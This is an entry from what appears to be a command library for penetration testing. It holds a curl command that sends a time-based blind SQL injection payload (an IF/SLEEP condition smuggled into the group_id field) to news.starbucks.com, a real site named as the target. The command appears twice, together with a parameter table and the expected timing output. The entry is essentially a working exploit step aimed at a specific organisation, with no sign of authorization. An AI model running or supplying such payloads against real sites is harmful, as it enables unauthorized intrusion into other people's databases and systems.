---
id: cmd-uuid-003
data: >-
  time curl --data
  "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND
  group_id='1" https://news.starbucks.com
tags:
  - blind-sqli
  - timing-attack
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.237Z'
verified: false
validated: true
submitted: true
---
# test-false-condition-sqli

## Command

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Description

Tests false condition (1=2) to confirm no SLEEP delay in SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Time measurement | Yes |
| `--data` | POST payload | Yes |
| Other params | As in true test | Yes |

## Examples

### Basic Usage

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Expected Output

real 0m0.860s
user 0m0.000s
sys 0m0.031s (no delay)

## Related

- [[commands/test-true-condition-sqli]]
